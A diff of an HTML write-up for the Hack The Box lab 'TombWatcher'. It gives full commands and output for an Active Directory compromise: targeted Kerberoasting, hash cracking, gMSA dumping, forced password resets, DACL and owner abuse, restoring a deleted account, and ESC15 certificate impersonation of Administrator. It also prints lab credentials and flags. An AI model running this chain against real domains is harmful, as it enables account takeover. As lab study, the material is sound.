-SMB 10.129.244.237 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.244.237 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV! 
-LDAP 10.129.244.237 389 DC01 Resolved collection methods: trusts, session, psremote, group, rdp, acl, localadmin, container, dcom, objectprops
-LDAP 10.129.244.237 389 DC01 Done in 00M 03S
-LDAP 10.129.244.237 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.244.237_2025-06-08_050257_bloodhound.zip</code></pre></div>
-      <p>We know the user henry and his password, so we can search for henry in Bloodhound and see that he has WriteSPN rights over the user Alfred. WriteSPN (Write servicePrincipalName) is an AD right that allows an account to change or add the servicePrincipalName of an AD object.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607214016.png" alt="Pasted image 20250607214016.png" loading="lazy" /><span class="img-caption">Pasted image 20250607214016.png</span></div>
-      <p>To exploit this, I will use the TargetKerberoast.py tool. The tool will automatically perform a targeted Kerberoast attack, either on all users or on a specific user if specified in the command line, and then obtain a crackable hash.</p>
+SMB         10.129.244.237  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.244.237  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
+LDAP        10.129.244.237  389    DC01             Resolved collection methods: trusts, session, psremote, group, rdp, acl, localadmin, container, dcom, objectprops
+LDAP        10.129.244.237  389    DC01             Done in 00M 03S
+LDAP        10.129.244.237  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.244.237_2025-06-08_050257_bloodhound.zip</code></pre></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607214016.png" alt="WriteSPN relationship from henry to Alfred" loading="lazy" /><span class="img-caption">WriteSPN relationship from henry to Alfred</span></div>
+      <h2 class="writeup-section-title">Foothold: Targeted Kerberoast</h2>
+      <p><strong>Targeted Kerberoasting</strong> works by first setting an SPN on a target account (using WriteSPN), then requesting a Kerberos service ticket for that SPN. The ticket is encrypted with the target account's password hash, which can be cracked offline.</p>
       <div class="code-block"><pre><code>python3 targetedKerberoast.py -v -d &#x27;tombwatcher.htb&#x27; -u henry -p &#x27;H3nry_987TGV!&#x27;
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
@@ -582,34 +288,36 @@ LDAP 10.129.244.237 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_1
 [+] Printing hash for (Alfred)
 $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$c5425eed95da3ed7698c62e9b644146b$23a0d33de4f4e0c7cf2470bfc2afa1c8150fa0bf2a053ad498deaa2b948d77d2faa65b388a0786bd4945dacaed51ab4053fe7a8a010ba1cddc558e3322014572da911d66896a206cb4df429418bf35a7b3f9c97ad89ae320f924bda1bcc41be6299fee02033a89973a7da7ba8bbeae1f461d95d145f68aa1ee34b87b228741ac1266f1ed105aa28c2f10abf7f8d626bb87737707d11002227fb9a4a10ce8bf26ed31765b00d461d023bd7e1469502965bfabe04b2b2cf0da003e7deeac59068ecd92334a6eb236a1bf6f4b6b2c68a645e46e079b5c7f69cc2006bd856574d5cc69eb658f84b353a3b3f34d2c0730d084f59289aa525d73d66539e85b5dbe9b760a29624b9a8e6761e06c11e6ac9acefe63e9cebf38c1507d14ddeb6d9fd03d15df2e8dbdeaf5f764ea5799cddc269e7fd11a23f6d259464459982ba23e4c60d838546035be689d0556b4faf8a3af58fc5f3a88a2d31e74700fbcea0835938ebcf4b7dc18e1ae20f167ead6c68a48a03b1ac2276b8371dea470af4eb808c0c96954d1d85e8de309960267a9f76703d2da6e285968972c575f06e878451bf17b9bb4bbb43315290c73aa1175a73ea22c2a98861a763029b5968305ca25a322c337ae34107688715b1c10c8cf8cb1bafc991ebb777d7de6973e22e0f260fb178af8382c862c2da1a6a1b38359e85cd856f257859c539d922a6052cb621e82b4204e3e0a5fb9fcbc6935a0004d2e4d43454517d690a966e5c45e74cc15a058a7fe5d7f359d055d713cbbb223e0617d59235cd6c3ae7879983be8cc513261457649b6c3aff63daf79969a4f6c8fdeb21699dec8720798a328b6970ee9e1fa19ab9283ec143cb28fc425735d361b5e3c6062534ca81d265d1424c237be8dd9ca8ab4a27732e1742a951f2531eb9b0562ed0b8b3173ad998f7986ad2900dc88a1df85e9b05c210cc59eca7836f97c5e424578b46e994e6f69c1e6aa9fd97a6fa518a68e566a8d14cd0437c083368bfc5524861af1f0e514c2b5fbdc84eef0a6d97ee1aa655ce011556b1ad2673cc3e96165e0ebb2124220d6f005dc9e73cc87e50685d7bc1558410dcfe8478c151cb362d38ef6374457d485d6c9c21e878917b79c5605eb1cd8ee380ce39ef43825e2927c89495fc278ab5bd8f89b57926223ab783efab297da300a51f0e0034e29b509aabc3e86416b81dffe12994713eb68182d77aa7b899a4b965e1f4bc6041b76a9188057008164b3934c4eac501f8725d85d3bbea3ec0a983ced8b92ed1b5ccc3069a93c4bfaadeb776b69221e021e5fffa2e00ab8593d3bbe280760dbfb49df804e56cdab0a09966280d80ed19e86e8beca1cfe1d06c2ce08f64d05ec70d34bbc70ab30dd8535d76070b60f00fbeca5b40b09d43af69b17fb42c8f73b60f113805bc718511e0fee1ea8217c5ee9317616c2d14690809ee8634870c2ac6dd63dbee659a8c25ed13683
 [VERBOSE] SPN removed successfully for (Alfred)</code></pre></div>
-      <p>I have now placed this hash in a homemade file and named it hash.txt. I will now crack it using John. Below, you can see that the password for the user Alfred is basketball.</p>
+      <p>I crack the hash with John the Ripper, recovering Alfred's password.</p>
       <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 4 OpenMP threads
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
-basketball (?) 
+basketball       (?)     
 1g 0:00:00:00 DONE (2025-06-08 01:30) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed.</code></pre></div>
-      <p>Now I checked in Bloodhound to see if the user Alfred can be used to add himself somewhere or if it can be used to change a user&#x27;s password, etc. In Bloodhound, we can see that the user can add himself to the Infrastructure group. For this, I will use BloodyAD. This tool is used to add a user to a target group.</p>
+      <h2 class="writeup-section-title">Lateral Movement: gMSA & WriteOwner Chain</h2>
+      <h3 class="writeup-sub-title">Adding to IT_SUPPORT Group</h3>
+      <p>In BloodHound, Alfred can add himself to a group that has <strong>ReadGMSAPassword</strong> permissions on the <code>Ansible_Dev$</code> service account.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;Alfred&#x27; -p &#x27;basketball&#x27; -d tombwatcher.htb add groupMember &quot;Infrastructure&quot; Alfred 
 [+] Alfred added to Infrastructure</code></pre></div>
-      <p>Now that I have added myself to this group, you can see that I have ReadGMSAPassword permissions on the user Ansible_Dev$.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607221941.png" alt="Pasted image 20250607221941.png" loading="lazy" /><span class="img-caption">Pasted image 20250607221941.png</span></div>
-      <p>For this readout, I will use the gMSADumper.py tool. With this, I will dump the hashes of that user.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607221941.png" alt="ReadGMSAPassword permission on Ansible_Dev$" loading="lazy" /><span class="img-caption">ReadGMSAPassword permission on Ansible_Dev$</span></div>
+      <h3 class="writeup-sub-title">gMSA Password Dump</h3>
+      <p><strong>gMSA</strong> (Group Managed Service Account) is a special AD account whose password is automatically managed by the domain. If you have <strong>ReadGMSAPassword</strong> rights, you can extract its NTLM hash. I use <code>gMSADumper.py</code> to do this.</p>
       <div class="code-block"><pre><code>python3 gMSADumper.py -u Alfred -p basketball -d tombwatcher.htb
 Users or groups who can read password for ansible_dev$:
  &gt; Infrastructure
 ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
 ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
 ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a</code></pre></div>
-      <p>Now I have seen in Bloodhound that the user ‘ansible_dev$’ can change the password of the user SAM. This is because this user has ForceChangePassword rights on the user SAM. For this, I will use Bloodyad.</p>
-      <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;ansible_dev$&#x27; -p &quot;:1c37d00093dc2a5f25176bf2d474afdc&quot; -d tombwatcher.htb --dc-ip 10.129.244.12 set password Sam Test123 
+      <h3 class="writeup-sub-title">Password Changes: Sam → John</h3>
+      <p>BloodHound shows <code>ansible_dev$</code> can change <code>Sam</code>'s password (ForceChangePassword). Sam has <strong>WriteOwner</strong> rights over <code>John</code>. I chain these: change Sam's password, take ownership of John, grant FullControl, then change John's password.</p>
+      <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;ansible_dev$&#x27; -p &quot;:1c37d00093dc2a5f25176bf2d474afdc&quot; -d tombwatcher.htb --dc-ip 10.129.244.12 set password Sam Test123   
 [+] Password changed successfully!</code></pre></div>
-      <p>Now that I have been able to change Sam&#x27;s password, I will also change John&#x27;s, since we have WriteOwner rights for the user John with Sam.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607230159.png" alt="Pasted image 20250607230159.png" loading="lazy" /><span class="img-caption">Pasted image 20250607230159.png</span></div>
-      <p>To change the password, I will use the net rpc tool because I encountered an error with Bloodyad. To change the ownership of the object, you may use Impacket&#x27;s owneredit.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607230159.png" alt="WriteOwner from Sam to John" loading="lazy" /><span class="img-caption">WriteOwner from Sam to John</span></div>
+      <p>I use <code>owneredit.py</code> to take ownership of the target AD object, which is the first step in gaining full control over it.</p>
       <div class="code-block"><pre><code>owneredit.py -action write -new-owner &#x27;Sam&#x27; -target &#x27;John&#x27; &#x27;tombwatcher.htb&#x27;/&#x27;Sam&#x27;:&#x27;Test123&#x27;
  
 [*] Current owner information below
@@ -617,110 +325,111 @@ ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a</code></pr
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <p>To abuse ownership of a user object, you may grant yourself the FullControl permission.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;Sam&#x27; -target &#x27;John&#x27; &#x27;tombwatcher.htb&#x27;/&#x27;Sam&#x27;:&#x27;Test123&#x27;
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20250608-025440.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>Change user password by using BloodyAD</p>
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;Sam&#x27; -p &quot;Test123&quot; -d tombwatcher.htb --dc-ip 10.129.111.103 set password John Test123</code></pre></div>
-      <p>We have been able to change the password for the user John, so I will now log in to the Windows machine with the above credentials.</p>
+      <h3 class="writeup-sub-title">User Flag</h3>
+      <p>I connect as John via Evil-WinRM and read the user flag.</p>
       <div class="code-block"><pre><code>evil-winrm -i tombwatcher.htb -u &#x27;John&#x27; -p &quot;Test123&quot;
- 
+                                 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\john\Documents&gt;</code></pre></div>
-      <p>So, we have found the first user flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">cc6d7526229f416110d93d74f2a750ee</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\john\Desktop&gt; ls
 
 
- Directory: C:\Users\john\Desktop
+    Directory: C:\Users\john\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 6/7/2025 8:07 PM 34 user.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/7/2025   8:07 PM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\john\Desktop&gt; cat user.txt
 cc6d7526229f416110d93d74f2a750ee</code></pre></div>
-      <p>Since we are now user John, I checked what I can do with this user. In Bloodhound, it says that I have GenericAll rights over ADCS OU. We will check the certificate templates with Certipy. You will see that the user with rid 1111 has Enrollment Rights/Write Property Enroll on the WebServer template. Also, enum the deleted users and you will see that user:</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">cc6d7526229f416110d93d74f2a750ee</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: AD Tombstone & Certificate Abuse</h2>
+      <h3 class="writeup-sub-title">Restoring Deleted AD Objects</h3>
+      <p>John has <strong>GenericAll</strong> rights over the AD Recycle Bin. The <strong>AD Tombstone</strong> feature allows querying and restoring deleted objects. I search for deleted user accounts.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\john\Documents&gt; Get-ADObject -Filter &#x27;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#x27; -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
 
 
-Name : cert_admin
- DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
-ObjectGUID : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
-objectSid : S-1-5-21-1392491010-1358638721-2126982587-1109
+Name            : cert_admin
+                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
 lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
 
-Name : cert_admin
- DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
-ObjectGUID : c1f1f0fe-df9c-494c-bf05-0679e181b358
-objectSid : S-1-5-21-1392491010-1358638721-2126982587-1110
+Name            : cert_admin
+                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
+objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
 lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
 
-Name : cert_admin
- DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
-ObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
-objectSid : S-1-5-21-1392491010-1358638721-2126982587-1111
+Name            : cert_admin
+                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
 lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb</code></pre></div>
-      <p>So, after checking which certificates have been deleted, we will be able to retrieve them because the user john has GenericAll rights over the OU ADCS. You can do this by using the following command.</p>
+      <p>A deleted account named <code>cert_admin</code> is found. I restore it using <code>Restore-ADObject</code>.</p>
       <div class="code-block"><pre><code>Restore-ADobject -Identity &#x27;938182c3-bf0b-410a-9aaa-45c8e1a02ebf&#x27;</code></pre></div>
-      <p>Above, we can see that there is a user called cert_admin. I am now going to try to change this user&#x27;s password.</p>
+      <p>Now that the <code>cert_admin</code> account has been restored from the AD Recycle Bin, I need to set a new password for it since the original password hash is no longer valid after deletion. Using <code>bloodyAD</code> or <code>net rpc</code>, I reset the password to a known value, giving me full control over this certificate administrator account.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u John -p &#x27;Test123&#x27; set password cert_admin &#x27;Test123&#x27;
 [+] Password changed successfully!</code></pre></div>
-      <p>Before we execute the certipy request command, we first need to find out which certificate, template, etc. we need. You can search for this by using the certipy find command. I used the following article for this. https://abrictosecurity.com/esc15-the-evolution-of-adcs-attacks/</p>
+      <h3 class="writeup-sub-title">Certificate Abuse with certipy</h3>
+      <p>I use certipy to find vulnerable certificate templates. This requires certipy v5.0.2 or later.</p>
       <div class="code-block"><pre><code>certipy find -u cert_admin@tombwatcher.htb -p &#x27;Test123&#x27; -dc-ip 10.129.111.103 -vulnerable
-Template Name : WebServer
- Display Name : Web Server
- Certificate Authorities : tombwatcher-CA-1
- Enabled : True
- Client Authentication : False
- Enrollment Agent : False
- Any Purpose : False
- Enrollee Supplies Subject : True
- Certificate Name Flag : EnrolleeSuppliesSubject
- Extended Key Usage : Server Authentication
- Requires Manager Approval : False
- Requires Key Archival : False
- Authorized Signatures Required : 0
- Schema Version : 1
- Validity Period : 2 years
- Renewal Period : 6 weeks
- Minimum RSA Key Length : 2048
- Template Created : 2024-11-16T00:57:49+00:00
- Template Last Modified : 2024-11-16T17:07:26+00:00
- Permissions
- Enrollment Permissions
- Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- S-1-5-21-1392491010-1358638721-2126982587-1111
- Object Control Permissions
- Owner : TOMBWATCHER.HTB\Enterprise Admins
- Full Control Principals : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- Write Owner Principals : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- Write Dacl Principals : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- Write Property Enroll : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- S-1-5-21-1392491010-1358638721-2126982587-1111
- [+] User Enrollable Principals : TOMBWATCHER.HTB\Domain Admins
- TOMBWATCHER.HTB\Enterprise Admins
- [+] User ACL Principals : TOMBWATCHER.HTB\Enterprise Admins
- [!] Vulnerabilities
- ESC15 : Enrollee supplies subject and schema version is 1.
- ESC4 : Template is owned by user.
- [*] Remarks
- ESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.</code></pre></div>
-      <p>To execute the command below, you must ensure that certipy version v5.0.2 is installed. Otherwise, you will receive an error message stating that “-application-policies” does not exist. I spent a long time troubleshooting this issue. With the command below, I will request a certificate for the domain controller of tombwatcher.htb via the Certificate Authority ‘tombwatcher-CA-1’.</p>
+Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+    [+] User ACL Principals             : TOMBWATCHER.HTB\Enterprise Admins
+    [!] Vulnerabilities
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+      ESC4                              : Template is owned by user.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.</code></pre></div>
+      <p>I request a certificate for the Administrator account using the vulnerable template.</p>
       <div class="code-block"><pre><code>certipy req -u &#x27;cert_admin@tombwatcher.htb&#x27; -p &#x27;Test123&#x27; -target dc01.tombwatcher.htb -ca &#x27;tombwatcher-CA-1&#x27; -template &#x27;WebServer&#x27; -upn &#x27;Administrator&#x27; -application-policies &#x27;Client Authentication&#x27;
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
@@ -736,12 +445,12 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Try using -sid to set the object SID or see the wiki for more details
 [*] Saving certificate and private key to &#x27;administrator.pfx&#x27;
 [*] Wrote certificate and private key to &#x27;administrator.pfx&#x27;</code></pre></div>
-      <p>We will now proceed with authentication using the administrator.pfx certificate. After authentication, an LDAP shell will open, after which the password of the Administrator user will change.</p>
-      <div class="code-block"><pre><code>certipy auth -pfx administrator.pfx -dc-ip 10.129.111.103 -domain tombwatcher.htb -ldap-shell 
+      <p>I authenticate with the certificate and obtain an LDAP shell, allowing me to change the Administrator's password.</p>
+      <div class="code-block"><pre><code>certipy auth -pfx administrator.pfx -dc-ip 10.129.111.103 -domain tombwatcher.htb -ldap-shell       
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
-[*] SAN UPN: &#x27;Administrator&#x27;
+[*]     SAN UPN: &#x27;Administrator&#x27;
 [*] Connecting to &#x27;ldaps://10.129.111.103:636&#x27;
 [*] Authenticated to &#x27;10.129.111.103&#x27; as: &#x27;u:TOMBWATCHER\\Administrator&#x27;
 Type help for list of commands
@@ -750,12 +459,8 @@ Type help for list of commands
 Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
 Attempting to set new password of: Test123
 Password changed successfully!</code></pre></div>
-      <h4 class="writeup-step-title">Login as Administrator</h4>
-      <p>As you can see below, I am now logged in as Administrator and can therefore obtain the root flag. This means that the Windows machine has been completely taken over.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">46b34fa53fb2b1cf743176ff8e23cafe</code>
-</div>
+      <h3 class="writeup-sub-title">Administrator Access</h3>
+      <p>I log in as Administrator via Evil-WinRM and obtain the root flag.</p>
       <div class="code-block"><pre><code>evil-winrm -i tombwatcher.htb -u &#x27;Administrator&#x27; -p &quot;Test123&quot;
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
 *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
@@ -763,20 +468,19 @@ Password changed successfully!</code></pre></div>
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
 
- Directory: C:\Users\Administrator\Desktop
+    Directory: C:\Users\Administrator\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 6/8/2025 6:13 AM 34 root.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/8/2025   6:13 AM             34 root.txt
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 46b34fa53fb2b1cf743176ff8e23cafe</code></pre></div>
-      <h4 class="writeup-step-title">ROOTED</h4>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250608103642.png" alt="Pasted image 20250608103642.png" loading="lazy" /><span class="img-caption">Pasted image 20250608103642.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">46b34fa53fb2b1cf743176ff8e23cafe</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250608103642.png" alt="Machine rooted as Administrator" loading="lazy" /><span class="img-caption">Machine rooted as Administrator</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
